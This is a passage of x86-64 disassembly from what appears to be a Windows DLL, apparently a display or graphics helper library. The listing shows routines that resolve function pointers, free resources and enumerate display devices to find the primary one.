   1800049be:	74 20                	je     0x1800049e0
   1800049c0:	48 8b 0f             	mov    (%rdi),%rcx
   1800049c3:	48 85 c9             	test   %rcx,%rcx
   1800049c6:	74 18                	je     0x1800049e0
   1800049c8:	48 85 db             	test   %rbx,%rbx
   1800049cb:	74 0b                	je     0x1800049d8
   1800049cd:	ff d3                	call   *%rbx
   1800049cf:	48 8b 1d 1a 5e 01 00 	mov    0x15e1a(%rip),%rbx        # 0x18001a7f0
   1800049d6:	eb 05                	jmp    0x1800049dd
   1800049d8:	e8 a3 0b 00 00       	call   0x180005580
   1800049dd:	4c 89 3f             	mov    %r15,(%rdi)
   1800049e0:	ff c6                	inc    %esi
   1800049e2:	48 83 c5 68          	add    $0x68,%rbp
   1800049e6:	41 3b b6 68 03 00 00 	cmp    0x368(%r14),%esi
   1800049ed:	7c c1                	jl     0x1800049b0
   1800049ef:	48 8b 6c 24 40       	mov    0x40(%rsp),%rbp
   1800049f4:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   1800049f9:	49 8d be 70 03 00 00 	lea    0x370(%r14),%rdi
   180004a00:	48 85 ff             	test   %rdi,%rdi
   180004a03:	74 20                	je     0x180004a25
   180004a05:	48 8b 0f             	mov    (%rdi),%rcx
   180004a08:	48 85 c9             	test   %rcx,%rcx
   180004a0b:	74 18                	je     0x180004a25
   180004a0d:	48 85 db             	test   %rbx,%rbx
   180004a10:	74 0b                	je     0x180004a1d
   180004a12:	ff d3                	call   *%rbx
   180004a14:	48 8b 1d d5 5d 01 00 	mov    0x15dd5(%rip),%rbx        # 0x18001a7f0
   180004a1b:	eb 05                	jmp    0x180004a22
   180004a1d:	e8 5e 0b 00 00       	call   0x180005580
   180004a22:	4c 89 3f             	mov    %r15,(%rdi)
   180004a25:	48 8b 7c 24 50       	mov    0x50(%rsp),%rdi
   180004a2a:	49 81 c6 60 03 00 00 	add    $0x360,%r14
   180004a31:	74 24                	je     0x180004a57
   180004a33:	49 8b 0e             	mov    (%r14),%rcx
   180004a36:	48 85 c9             	test   %rcx,%rcx
   180004a39:	74 1c                	je     0x180004a57
   180004a3b:	48 85 db             	test   %rbx,%rbx
   180004a3e:	74 0f                	je     0x180004a4f
   180004a40:	ff d3                	call   *%rbx
   180004a42:	4d 89 3e             	mov    %r15,(%r14)
   180004a45:	48 83 c4 20          	add    $0x20,%rsp
   180004a49:	41 5f                	pop    %r15
   180004a4b:	41 5e                	pop    %r14
   180004a4d:	5b                   	pop    %rbx
   180004a4e:	c3                   	ret
   180004a4f:	e8 2c 0b 00 00       	call   0x180005580
   180004a54:	4d 89 3e             	mov    %r15,(%r14)
   180004a57:	48 83 c4 20          	add    $0x20,%rsp
   180004a5b:	41 5f                	pop    %r15
   180004a5d:	41 5e                	pop    %r14
   180004a5f:	5b                   	pop    %rbx
   180004a60:	c3                   	ret
   180004a61:	cc                   	int3
   180004a62:	cc                   	int3
   180004a63:	cc                   	int3
   180004a64:	cc                   	int3
   180004a65:	cc                   	int3
   180004a66:	cc                   	int3
   180004a67:	cc                   	int3
   180004a68:	cc                   	int3
   180004a69:	cc                   	int3
   180004a6a:	cc                   	int3
   180004a6b:	cc                   	int3
   180004a6c:	cc                   	int3
   180004a6d:	cc                   	int3
   180004a6e:	cc                   	int3
   180004a6f:	cc                   	int3
   180004a70:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180004a75:	48 63 81 68 03 00 00 	movslq 0x368(%rcx),%rax
   180004a7c:	85 c0                	test   %eax,%eax
   180004a7e:	7e 51                	jle    0x180004ad1
   180004a80:	4c 8b 81 60 03 00 00 	mov    0x360(%rcx),%r8
   180004a87:	4c 8b 99 70 03 00 00 	mov    0x370(%rcx),%r11
   180004a8e:	8b 9a 0c 01 00 00    	mov    0x10c(%rdx),%ebx
   180004a94:	45 33 c9             	xor    %r9d,%r9d
   180004a97:	4c 8b d0             	mov    %rax,%r10
   180004a9a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   180004aa0:	49 63 40 60          	movslq 0x60(%r8),%rax
   180004aa4:	48 69 c0 24 06 00 00 	imul   $0x624,%rax,%rax
   180004aab:	42 39 9c 18 0c 01 00 	cmp    %ebx,0x10c(%rax,%r11,1)
   180004ab2:	00 
   180004ab3:	75 10                	jne    0x180004ac5
   180004ab5:	8b 8a 08 01 00 00    	mov    0x108(%rdx),%ecx
   180004abb:	42 39 8c 18 08 01 00 	cmp    %ecx,0x108(%rax,%r11,1)
   180004ac2:	00 
   180004ac3:	74 14                	je     0x180004ad9
   180004ac5:	49 ff c1             	inc    %r9
   180004ac8:	49 83 c0 68          	add    $0x68,%r8
   180004acc:	4d 3b ca             	cmp    %r10,%r9
   180004acf:	7c cf                	jl     0x180004aa0
   180004ad1:	33 c0                	xor    %eax,%eax
   180004ad3:	48 8b 5c 24 08       	mov    0x8(%rsp),%rbx
   180004ad8:	c3                   	ret
   180004ad9:	48 8b 5c 24 08       	mov    0x8(%rsp),%rbx
   180004ade:	49 8b c0             	mov    %r8,%rax
   180004ae1:	c3                   	ret
   180004ae2:	cc                   	int3
   180004ae3:	cc                   	int3
   180004ae4:	cc                   	int3
   180004ae5:	cc                   	int3
   180004ae6:	cc                   	int3
   180004ae7:	cc                   	int3
   180004ae8:	cc                   	int3
   180004ae9:	cc                   	int3
   180004aea:	cc                   	int3
   180004aeb:	cc                   	int3
   180004aec:	cc                   	int3
   180004aed:	cc                   	int3
   180004aee:	cc                   	int3
   180004aef:	cc                   	int3
   180004af0:	40 53                	rex push %rbx
   180004af2:	48 83 ec 20          	sub    $0x20,%rsp
   180004af6:	48 8b d9             	mov    %rcx,%rbx
   180004af9:	48 8b 09             	mov    (%rcx),%rcx
   180004afc:	48 8d 15 75 c9 00 00 	lea    0xc975(%rip),%rdx        # 0x180011478
   180004b03:	ff 15 4f c5 00 00    	call   *0xc54f(%rip)        # 0x180011058
   180004b09:	48 8b 0b             	mov    (%rbx),%rcx
   180004b0c:	48 8d 15 85 c9 00 00 	lea    0xc985(%rip),%rdx        # 0x180011498
   180004b13:	48 89 43 10          	mov    %rax,0x10(%rbx)
   180004b17:	ff 15 3b c5 00 00    	call   *0xc53b(%rip)        # 0x180011058
   180004b1d:	48 8b 0b             	mov    (%rbx),%rcx
   180004b20:	48 8d 15 91 c9 00 00 	lea    0xc991(%rip),%rdx        # 0x1800114b8
   180004b27:	48 89 43 18          	mov    %rax,0x18(%rbx)
   180004b2b:	ff 15 27 c5 00 00    	call   *0xc527(%rip)        # 0x180011058
   180004b31:	48 8b 0b             	mov    (%rbx),%rcx
   180004b34:	48 8d 15 a5 c9 00 00 	lea    0xc9a5(%rip),%rdx        # 0x1800114e0
   180004b3b:	48 89 43 20          	mov    %rax,0x20(%rbx)
   180004b3f:	ff 15 13 c5 00 00    	call   *0xc513(%rip)        # 0x180011058
   180004b45:	48 8b 0b             	mov    (%rbx),%rcx
   180004b48:	48 8d 15 b1 c9 00 00 	lea    0xc9b1(%rip),%rdx        # 0x180011500
   180004b4f:	48 89 43 28          	mov    %rax,0x28(%rbx)
   180004b53:	ff 15 ff c4 00 00    	call   *0xc4ff(%rip)        # 0x180011058
   180004b59:	48 8b 0b             	mov    (%rbx),%rcx
   180004b5c:	48 8d 15 bd c9 00 00 	lea    0xc9bd(%rip),%rdx        # 0x180011520
   180004b63:	48 89 43 30          	mov    %rax,0x30(%rbx)
   180004b67:	ff 15 eb c4 00 00    	call   *0xc4eb(%rip)        # 0x180011058
   180004b6d:	48 8b 0b             	mov    (%rbx),%rcx
   180004b70:	48 8d 15 d1 c9 00 00 	lea    0xc9d1(%rip),%rdx        # 0x180011548
   180004b77:	48 89 43 38          	mov    %rax,0x38(%rbx)
   180004b7b:	ff 15 d7 c4 00 00    	call   *0xc4d7(%rip)        # 0x180011058
   180004b81:	48 8b 0b             	mov    (%rbx),%rcx
   180004b84:	48 8d 15 d5 c9 00 00 	lea    0xc9d5(%rip),%rdx        # 0x180011560
   180004b8b:	48 89 43 40          	mov    %rax,0x40(%rbx)
   180004b8f:	ff 15 c3 c4 00 00    	call   *0xc4c3(%rip)        # 0x180011058
   180004b95:	48 8b 0b             	mov    (%rbx),%rcx
   180004b98:	48 8d 15 e9 c9 00 00 	lea    0xc9e9(%rip),%rdx        # 0x180011588
   180004b9f:	48 89 43 48          	mov    %rax,0x48(%rbx)
   180004ba3:	ff 15 af c4 00 00    	call   *0xc4af(%rip)        # 0x180011058
   180004ba9:	48 8b 0b             	mov    (%rbx),%rcx
   180004bac:	48 8d 15 f5 c9 00 00 	lea    0xc9f5(%rip),%rdx        # 0x1800115a8
   180004bb3:	48 89 43 50          	mov    %rax,0x50(%rbx)
   180004bb7:	ff 15 9b c4 00 00    	call   *0xc49b(%rip)        # 0x180011058
   180004bbd:	48 8b 0b             	mov    (%rbx),%rcx
   180004bc0:	48 8d 15 09 ca 00 00 	lea    0xca09(%rip),%rdx        # 0x1800115d0
   180004bc7:	48 89 43 58          	mov    %rax,0x58(%rbx)
   180004bcb:	ff 15 87 c4 00 00    	call   *0xc487(%rip)        # 0x180011058
   180004bd1:	48 8b 0b             	mov    (%rbx),%rcx
   180004bd4:	48 8d 15 1d ca 00 00 	lea    0xca1d(%rip),%rdx        # 0x1800115f8
   180004bdb:	48 89 43 60          	mov    %rax,0x60(%rbx)
   180004bdf:	ff 15 73 c4 00 00    	call   *0xc473(%rip)        # 0x180011058
   180004be5:	48 8b 0b             	mov    (%rbx),%rcx
   180004be8:	48 8d 15 31 ca 00 00 	lea    0xca31(%rip),%rdx        # 0x180011620
   180004bef:	48 89 43 68          	mov    %rax,0x68(%rbx)
   180004bf3:	ff 15 5f c4 00 00    	call   *0xc45f(%rip)        # 0x180011058
   180004bf9:	48 8b 0b             	mov    (%rbx),%rcx
   180004bfc:	48 8d 15 3d ca 00 00 	lea    0xca3d(%rip),%rdx        # 0x180011640
   180004c03:	48 89 43 70          	mov    %rax,0x70(%rbx)
   180004c07:	ff 15 4b c4 00 00    	call   *0xc44b(%rip)        # 0x180011058
   180004c0d:	48 8b 0b             	mov    (%rbx),%rcx
   180004c10:	48 8d 15 49 ca 00 00 	lea    0xca49(%rip),%rdx        # 0x180011660
   180004c17:	48 89 43 78          	mov    %rax,0x78(%rbx)
   180004c1b:	ff 15 37 c4 00 00    	call   *0xc437(%rip)        # 0x180011058
   180004c21:	48 8b 0b             	mov    (%rbx),%rcx
   180004c24:	48 8d 15 5d ca 00 00 	lea    0xca5d(%rip),%rdx        # 0x180011688
   180004c2b:	48 89 83 80 00 00 00 	mov    %rax,0x80(%rbx)
   180004c32:	ff 15 20 c4 00 00    	call   *0xc420(%rip)        # 0x180011058
   180004c38:	48 8b 0b             	mov    (%rbx),%rcx
   180004c3b:	48 8d 15 66 ca 00 00 	lea    0xca66(%rip),%rdx        # 0x1800116a8
   180004c42:	48 89 83 88 00 00 00 	mov    %rax,0x88(%rbx)
   180004c49:	ff 15 09 c4 00 00    	call   *0xc409(%rip)        # 0x180011058
   180004c4f:	48 8b 0b             	mov    (%rbx),%rcx
   180004c52:	48 8d 15 6f ca 00 00 	lea    0xca6f(%rip),%rdx        # 0x1800116c8
   180004c59:	48 89 83 90 00 00 00 	mov    %rax,0x90(%rbx)
   180004c60:	ff 15 f2 c3 00 00    	call   *0xc3f2(%rip)        # 0x180011058
   180004c66:	48 8b 0b             	mov    (%rbx),%rcx
   180004c69:	48 8d 15 70 ca 00 00 	lea    0xca70(%rip),%rdx        # 0x1800116e0
   180004c70:	48 89 83 98 00 00 00 	mov    %rax,0x98(%rbx)
   180004c77:	ff 15 db c3 00 00    	call   *0xc3db(%rip)        # 0x180011058
   180004c7d:	48 8b 0b             	mov    (%rbx),%rcx
   180004c80:	48 8d 15 81 ca 00 00 	lea    0xca81(%rip),%rdx        # 0x180011708
   180004c87:	48 89 83 a0 00 00 00 	mov    %rax,0xa0(%rbx)
   180004c8e:	ff 15 c4 c3 00 00    	call   *0xc3c4(%rip)        # 0x180011058
   180004c94:	48 89 83 a8 00 00 00 	mov    %rax,0xa8(%rbx)
   180004c9b:	48 8b 0b             	mov    (%rbx),%rcx
   180004c9e:	48 8d 15 8b ca 00 00 	lea    0xca8b(%rip),%rdx        # 0x180011730
   180004ca5:	ff 15 ad c3 00 00    	call   *0xc3ad(%rip)        # 0x180011058
   180004cab:	48 8b 0b             	mov    (%rbx),%rcx
   180004cae:	48 8d 15 9b ca 00 00 	lea    0xca9b(%rip),%rdx        # 0x180011750
   180004cb5:	48 89 83 b0 00 00 00 	mov    %rax,0xb0(%rbx)
   180004cbc:	ff 15 96 c3 00 00    	call   *0xc396(%rip)        # 0x180011058
   180004cc2:	48 83 7b 10 00       	cmpq   $0x0,0x10(%rbx)
   180004cc7:	48 89 83 b8 00 00 00 	mov    %rax,0xb8(%rbx)
   180004cce:	74 53                	je     0x180004d23
   180004cd0:	48 83 7b 18 00       	cmpq   $0x0,0x18(%rbx)
   180004cd5:	74 4c                	je     0x180004d23
   180004cd7:	48 83 7b 70 00       	cmpq   $0x0,0x70(%rbx)
   180004cdc:	74 45                	je     0x180004d23
   180004cde:	48 83 7b 20 00       	cmpq   $0x0,0x20(%rbx)
   180004ce3:	74 3e                	je     0x180004d23
   180004ce5:	48 83 7b 28 00       	cmpq   $0x0,0x28(%rbx)
   180004cea:	74 37                	je     0x180004d23
   180004cec:	48 83 7b 30 00       	cmpq   $0x0,0x30(%rbx)
   180004cf1:	74 30                	je     0x180004d23
   180004cf3:	48 83 bb 80 00 00 00 	cmpq   $0x0,0x80(%rbx)
   180004cfa:	00 
   180004cfb:	74 26                	je     0x180004d23
   180004cfd:	48 83 bb 88 00 00 00 	cmpq   $0x0,0x88(%rbx)
   180004d04:	00 
   180004d05:	74 1c                	je     0x180004d23
   180004d07:	48 83 bb 90 00 00 00 	cmpq   $0x0,0x90(%rbx)
   180004d0e:	00 
   180004d0f:	74 12                	je     0x180004d23
   180004d11:	48 83 bb 98 00 00 00 	cmpq   $0x0,0x98(%rbx)
   180004d18:	00 
   180004d19:	74 08                	je     0x180004d23
   180004d1b:	33 c0                	xor    %eax,%eax
   180004d1d:	48 83 c4 20          	add    $0x20,%rsp
   180004d21:	5b                   	pop    %rbx
   180004d22:	c3                   	ret
   180004d23:	b8 05 00 00 00       	mov    $0x5,%eax
   180004d28:	48 83 c4 20          	add    $0x20,%rsp
   180004d2c:	5b                   	pop    %rbx
   180004d2d:	c3                   	ret
   180004d2e:	cc                   	int3
   180004d2f:	cc                   	int3
   180004d30:	40 53                	rex push %rbx
   180004d32:	48 83 ec 20          	sub    $0x20,%rsp
   180004d36:	83 b9 68 03 00 00 00 	cmpl   $0x0,0x368(%rcx)
   180004d3d:	48 8b d9             	mov    %rcx,%rbx
   180004d40:	7e 77                	jle    0x180004db9
   180004d42:	48 8b 81 60 03 00 00 	mov    0x360(%rcx),%rax
   180004d49:	81 78 10 02 10 00 00 	cmpl   $0x1002,0x10(%rax)
   180004d50:	75 67                	jne    0x180004db9
   180004d52:	8d 42 ff             	lea    -0x1(%rdx),%eax
   180004d55:	89 91 c4 00 00 00    	mov    %edx,0xc4(%rcx)
   180004d5b:	83 f8 01             	cmp    $0x1,%eax
   180004d5e:	77 59                	ja     0x180004db9
   180004d60:	48 8d 15 d1 c6 00 00 	lea    0xc6d1(%rip),%rdx        # 0x180011438
   180004d67:	48 8d 0d da c6 00 00 	lea    0xc6da(%rip),%rcx        # 0x180011448
   180004d6e:	e8 2d d5 ff ff       	call   0x1800022a0
   180004d73:	48 89 83 c8 00 00 00 	mov    %rax,0xc8(%rbx)
   180004d7a:	48 85 c0             	test   %rax,%rax
   180004d7d:	74 3a                	je     0x180004db9
   180004d7f:	48 8d 15 d2 c6 00 00 	lea    0xc6d2(%rip),%rdx        # 0x180011458
   180004d86:	48 8b c8             	mov    %rax,%rcx
   180004d89:	ff 15 c9 c2 00 00    	call   *0xc2c9(%rip)        # 0x180011058
   180004d8f:	48 85 c0             	test   %rax,%rax
   180004d92:	74 25                	je     0x180004db9
   180004d94:	8b 8b c4 00 00 00    	mov    0xc4(%rbx),%ecx
   180004d9a:	83 f9 02             	cmp    $0x2,%ecx
   180004d9d:	75 08                	jne    0x180004da7
   180004d9f:	48 83 c4 20          	add    $0x20,%rsp
   180004da3:	5b                   	pop    %rbx
   180004da4:	48 ff e0             	rex.W jmp *%rax
   180004da7:	83 f9 01             	cmp    $0x1,%ecx
   180004daa:	75 0d                	jne    0x180004db9
   180004dac:	b9 03 00 00 00       	mov    $0x3,%ecx
   180004db1:	48 83 c4 20          	add    $0x20,%rsp
   180004db5:	5b                   	pop    %rbx
   180004db6:	48 ff e0             	rex.W jmp *%rax
   180004db9:	48 83 c4 20          	add    $0x20,%rsp
   180004dbd:	5b                   	pop    %rbx
   180004dbe:	c3                   	ret
   180004dbf:	cc                   	int3
   180004dc0:	40 53                	rex push %rbx
   180004dc2:	48 83 ec 20          	sub    $0x20,%rsp
   180004dc6:	48 8b d9             	mov    %rcx,%rbx
   180004dc9:	48 85 c9             	test   %rcx,%rcx
   180004dcc:	75 09                	jne    0x180004dd7
   180004dce:	8d 41 02             	lea    0x2(%rcx),%eax
   180004dd1:	48 83 c4 20          	add    $0x20,%rsp
   180004dd5:	5b                   	pop    %rbx
   180004dd6:	c3                   	ret
   180004dd7:	48 8b 89 c8 00 00 00 	mov    0xc8(%rcx),%rcx
   180004dde:	48 85 c9             	test   %rcx,%rcx
   180004de1:	74 11                	je     0x180004df4
   180004de3:	ff 15 77 c2 00 00    	call   *0xc277(%rip)        # 0x180011060
   180004de9:	48 c7 83 c8 00 00 00 	movq   $0x0,0xc8(%rbx)
   180004df0:	00 00 00 00 
   180004df4:	48 8b cb             	mov    %rbx,%rcx
   180004df7:	e8 74 fb ff ff       	call   0x180004970
   180004dfc:	48 8b 43 18          	mov    0x18(%rbx),%rax
   180004e00:	48 85 c0             	test   %rax,%rax
   180004e03:	74 13                	je     0x180004e18
   180004e05:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   180004e09:	48 85 c9             	test   %rcx,%rcx
   180004e0c:	74 0a                	je     0x180004e18
   180004e0e:	ff d0                	call   *%rax
   180004e10:	48 c7 43 08 00 00 00 	movq   $0x0,0x8(%rbx)
   180004e17:	00 
   180004e18:	48 8b 0b             	mov    (%rbx),%rcx
   180004e1b:	48 85 c9             	test   %rcx,%rcx
   180004e1e:	74 0d                	je     0x180004e2d
   180004e20:	ff 15 3a c2 00 00    	call   *0xc23a(%rip)        # 0x180011060
   180004e26:	48 c7 03 00 00 00 00 	movq   $0x0,(%rbx)
   180004e2d:	48 8b 05 bc 59 01 00 	mov    0x159bc(%rip),%rax        # 0x18001a7f0
   180004e34:	48 8b cb             	mov    %rbx,%rcx
   180004e37:	48 85 c0             	test   %rax,%rax
   180004e3a:	74 0a                	je     0x180004e46
   180004e3c:	ff d0                	call   *%rax
   180004e3e:	33 c0                	xor    %eax,%eax
   180004e40:	48 83 c4 20          	add    $0x20,%rsp
   180004e44:	5b                   	pop    %rbx
   180004e45:	c3                   	ret
   180004e46:	e8 35 07 00 00       	call   0x180005580
   180004e4b:	33 c0                	xor    %eax,%eax
   180004e4d:	48 83 c4 20          	add    $0x20,%rsp
   180004e51:	5b                   	pop    %rbx
   180004e52:	c3                   	ret
   180004e53:	cc                   	int3
   180004e54:	cc                   	int3
   180004e55:	cc                   	int3
   180004e56:	cc                   	int3
   180004e57:	cc                   	int3
   180004e58:	cc                   	int3
   180004e59:	cc                   	int3
   180004e5a:	cc                   	int3
   180004e5b:	cc                   	int3
   180004e5c:	cc                   	int3
   180004e5d:	cc                   	int3
   180004e5e:	cc                   	int3
   180004e5f:	cc                   	int3
   180004e60:	48 85 c9             	test   %rcx,%rcx
   180004e63:	74 17                	je     0x180004e7c
   180004e65:	48 85 d2             	test   %rdx,%rdx
   180004e68:	74 12                	je     0x180004e7c
   180004e6a:	48 83 79 08 00       	cmpq   $0x0,0x8(%rcx)
   180004e6f:	74 0b                	je     0x180004e7c
   180004e71:	8b 81 c0 00 00 00    	mov    0xc0(%rcx),%eax
   180004e77:	89 02                	mov    %eax,(%rdx)
   180004e79:	33 c0                	xor    %eax,%eax
   180004e7b:	c3                   	ret
   180004e7c:	b8 02 00 00 00       	mov    $0x2,%eax
   180004e81:	c3                   	ret
   180004e82:	cc                   	int3
   180004e83:	cc                   	int3
   180004e84:	cc                   	int3
   180004e85:	cc                   	int3
   180004e86:	cc                   	int3
   180004e87:	cc                   	int3
   180004e88:	cc                   	int3
   180004e89:	cc                   	int3
   180004e8a:	cc                   	int3
   180004e8b:	cc                   	int3
   180004e8c:	cc                   	int3
   180004e8d:	cc                   	int3
   180004e8e:	cc                   	int3
   180004e8f:	cc                   	int3
   180004e90:	40 57                	rex push %rdi
   180004e92:	41 56                	push   %r14
   180004e94:	41 57                	push   %r15
   180004e96:	48 81 ec f0 01 00 00 	sub    $0x1f0,%rsp
   180004e9d:	48 8b 05 5c 41 01 00 	mov    0x1415c(%rip),%rax        # 0x180019000
   180004ea4:	48 33 c4             	xor    %rsp,%rax
   180004ea7:	48 89 84 24 d0 01 00 	mov    %rax,0x1d0(%rsp)
   180004eae:	00 
   180004eaf:	4d 8b f0             	mov    %r8,%r14
   180004eb2:	4c 8b fa             	mov    %rdx,%r15
   180004eb5:	48 8b f9             	mov    %rcx,%rdi
   180004eb8:	48 85 c9             	test   %rcx,%rcx
   180004ebb:	75 08                	jne    0x180004ec5
   180004ebd:	8d 41 02             	lea    0x2(%rcx),%eax
   180004ec0:	e9 ab 02 00 00       	jmp    0x180005170
   180004ec5:	48 89 9c 24 e8 01 00 	mov    %rbx,0x1e8(%rsp)
   180004ecc:	00 
   180004ecd:	48 85 d2             	test   %rdx,%rdx
   180004ed0:	74 21                	je     0x180004ef3
   180004ed2:	48 8b 02             	mov    (%rdx),%rax
   180004ed5:	48 85 c0             	test   %rax,%rax
   180004ed8:	74 19                	je     0x180004ef3
   180004eda:	48 8b 4a 08          	mov    0x8(%rdx),%rcx
   180004ede:	48 85 c9             	test   %rcx,%rcx
   180004ee1:	74 10                	je     0x180004ef3
   180004ee3:	48 89 05 fe 58 01 00 	mov    %rax,0x158fe(%rip)        # 0x18001a7e8
   180004eea:	48 89 0d ff 58 01 00 	mov    %rcx,0x158ff(%rip)        # 0x18001a7f0
   180004ef1:	eb 07                	jmp    0x180004efa
   180004ef3:	48 8b 05 ee 58 01 00 	mov    0x158ee(%rip),%rax        # 0x18001a7e8
   180004efa:	48 85 c0             	test   %rax,%rax
   180004efd:	74 09                	je     0x180004f08
   180004eff:	b9 80 03 00 00       	mov    $0x380,%ecx
   180004f04:	ff d0                	call   *%rax
   180004f06:	eb 0a                	jmp    0x180004f12
   180004f08:	b9 80 03 00 00       	mov    $0x380,%ecx
   180004f0d:	e8 ae 06 00 00       	call   0x1800055c0
   180004f12:	48 8b d8             	mov    %rax,%rbx
   180004f15:	48 89 07             	mov    %rax,(%rdi)
   180004f18:	48 85 c0             	test   %rax,%rax
   180004f1b:	75 08                	jne    0x180004f25
   180004f1d:	8d 43 03             	lea    0x3(%rbx),%eax
   180004f20:	e9 43 02 00 00       	jmp    0x180005168
   180004f25:	33 d2                	xor    %edx,%edx
   180004f27:	41 b8 80 03 00 00    	mov    $0x380,%r8d
   180004f2d:	48 8b cb             	mov    %rbx,%rcx
   180004f30:	e8 2b 03 00 00       	call   0x180005260
   180004f35:	48 8d 15 34 c8 00 00 	lea    0xc834(%rip),%rdx        # 0x180011770
   180004f3c:	48 8d 0d 3d c8 00 00 	lea    0xc83d(%rip),%rcx        # 0x180011780
   180004f43:	e8 58 d3 ff ff       	call   0x1800022a0
   180004f48:	48 8b cb             	mov    %rbx,%rcx
   180004f4b:	48 89 03             	mov    %rax,(%rbx)
   180004f4e:	48 85 c0             	test   %rax,%rax
   180004f51:	75 2a                	jne    0x180004f7d
   180004f53:	48 89 07             	mov    %rax,(%rdi)
   180004f56:	48 8b 05 93 58 01 00 	mov    0x15893(%rip),%rax        # 0x18001a7f0
   180004f5d:	48 85 c0             	test   %rax,%rax
   180004f60:	74 0c                	je     0x180004f6e
   180004f62:	ff d0                	call   *%rax
   180004f64:	b8 04 00 00 00       	mov    $0x4,%eax
   180004f69:	e9 fa 01 00 00       	jmp    0x180005168
   180004f6e:	e8 0d 06 00 00       	call   0x180005580
   180004f73:	b8 04 00 00 00       	mov    $0x4,%eax
   180004f78:	e9 eb 01 00 00       	jmp    0x180005168
   180004f7d:	48 89 ac 24 e0 01 00 	mov    %rbp,0x1e0(%rsp)
   180004f84:	00 
   180004f85:	e8 66 fb ff ff       	call   0x180004af0
   180004f8a:	8b e8                	mov    %eax,%ebp
   180004f8c:	85 c0                	test   %eax,%eax
   180004f8e:	74 2b                	je     0x180004fbb
   180004f90:	48 8b 15 59 58 01 00 	mov    0x15859(%rip),%rdx        # 0x18001a7f0
   180004f97:	48 c7 07 00 00 00 00 	movq   $0x0,(%rdi)
   180004f9e:	48 8b cb             	mov    %rbx,%rcx
   180004fa1:	48 85 d2             	test   %rdx,%rdx
   180004fa4:	74 09                	je     0x180004faf
   180004fa6:	ff d2                	call   *%rdx
   180004fa8:	8b c5                	mov    %ebp,%eax
   180004faa:	e9 b1 01 00 00       	jmp    0x180005160
   180004faf:	e8 cc 05 00 00       	call   0x180005580
   180004fb4:	8b c5                	mov    %ebp,%eax
   180004fb6:	e9 a5 01 00 00       	jmp    0x180005160
   180004fbb:	4c 8d 43 08          	lea    0x8(%rbx),%r8
   180004fbf:	48 8d 0d 3a f9 ff ff 	lea    -0x6c6(%rip),%rcx        # 0x180004900
   180004fc6:	ba 01 00 00 00       	mov    $0x1,%edx
   180004fcb:	ff 53 10             	call   *0x10(%rbx)
   180004fce:	85 c0                	test   %eax,%eax
   180004fd0:	74 31                	je     0x180005003
   180004fd2:	48 8b 05 17 58 01 00 	mov    0x15817(%rip),%rax        # 0x18001a7f0
   180004fd9:	48 c7 07 00 00 00 00 	movq   $0x0,(%rdi)
   180004fe0:	48 8b cb             	mov    %rbx,%rcx
   180004fe3:	48 85 c0             	test   %rax,%rax
   180004fe6:	74 0c                	je     0x180004ff4
   180004fe8:	ff d0                	call   *%rax
   180004fea:	b8 07 00 00 00       	mov    $0x7,%eax
   180004fef:	e9 6c 01 00 00       	jmp    0x180005160
   180004ff4:	e8 87 05 00 00       	call   0x180005580
   180004ff9:	b8 07 00 00 00       	mov    $0x7,%eax
   180004ffe:	e9 5d 01 00 00       	jmp    0x180005160
   180005003:	48 8d 15 86 c7 00 00 	lea    0xc786(%rip),%rdx        # 0x180011790
   18000500a:	48 8d 0d 8f c7 00 00 	lea    0xc78f(%rip),%rcx        # 0x1800117a0
   180005011:	ff 15 29 c0 00 00    	call   *0xc029(%rip)        # 0x180011040
   180005017:	48 8b cb             	mov    %rbx,%rcx
   18000501a:	e8 71 f4 ff ff       	call   0x180004490
   18000501f:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   180005024:	33 d2                	xor    %edx,%edx
   180005026:	41 b8 a8 01 00 00    	mov    $0x1a8,%r8d
   18000502c:	33 ff                	xor    %edi,%edi
   18000502e:	e8 2d 02 00 00       	call   0x180005260
   180005033:	4c 8d 44 24 20       	lea    0x20(%rsp),%r8
   180005038:	45 33 c9             	xor    %r9d,%r9d
   18000503b:	33 d2                	xor    %edx,%edx
   18000503d:	33 c9                	xor    %ecx,%ecx
   18000503f:	c7 44 24 20 a8 01 00 	movl   $0x1a8,0x20(%rsp)
   180005046:	00 
   180005047:	ff 15 0b c2 00 00    	call   *0xc20b(%rip)        # 0x180011258
   18000504d:	85 c0                	test   %eax,%eax
   18000504f:	0f 84 93 00 00 00    	je     0x1800050e8
   180005055:	f6 84 24 c4 00 00 00 	testb  $0x4,0xc4(%rsp)
   18000505c:	04 
   18000505d:	75 1a                	jne    0x180005079
   18000505f:	ff c7                	inc    %edi
   180005061:	4c 8d 44 24 20       	lea    0x20(%rsp),%r8
   180005066:	45 33 c9             	xor    %r9d,%r9d
   180005069:	8b d7                	mov    %edi,%edx
   18000506b:	33 c9                	xor    %ecx,%ecx
   18000506d:	ff 15 e5 c1 00 00    	call   *0xc1e5(%rip)        # 0x180011258
   180005073:	85 c0                	test   %eax,%eax
   180005075:	75 de                	jne    0x180005055
   180005077:	eb 6f                	jmp    0x1800050e8
   180005079:	33 ff                	xor    %edi,%edi
   18000507b:	39 bb 78 03 00 00    	cmp    %edi,0x378(%rbx)
   180005081:	7e 65                	jle    0x1800050e8
   180005083:	0f 1f 40 00          	nopl   0x0(%rax)
   180005087:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   18000508e:	00 00 
   180005090:	48 63 c7             	movslq %edi,%rax
   180005093:	4c 8d 44 24 24       	lea    0x24(%rsp),%r8
   180005098:	4c 69 c8 24 06 00 00 	imul   $0x624,%rax,%r9
   18000509f:	4c 03 8b 70 03 00 00 	add    0x370(%rbx),%r9
   1800050a6:	49 8d 81 18 02 00 00 	lea    0x218(%r9),%rax
   1800050ad:	4c 2b c0             	sub    %rax,%r8
   1800050b0:	0f b6 10             	movzbl (%rax),%edx
   1800050b3:	42 0f b6 0c 00       	movzbl (%rax,%r8,1),%ecx
   1800050b8:	2b d1                	sub    %ecx,%edx
   1800050ba:	75 07                	jne    0x1800050c3
   1800050bc:	48 ff c0             	inc    %rax
   1800050bf:	85 c9                	test   %ecx,%ecx
   1800050c1:	75 ed                	jne    0x1800050b0
   1800050c3:	85 d2                	test   %edx,%edx
   1800050c5:	75 17                	jne    0x1800050de
   1800050c7:	49 8b d1             	mov    %r9,%rdx
   1800050ca:	48 8b cb             	mov    %rbx,%rcx
   1800050cd:	e8 9e f9 ff ff       	call   0x180004a70
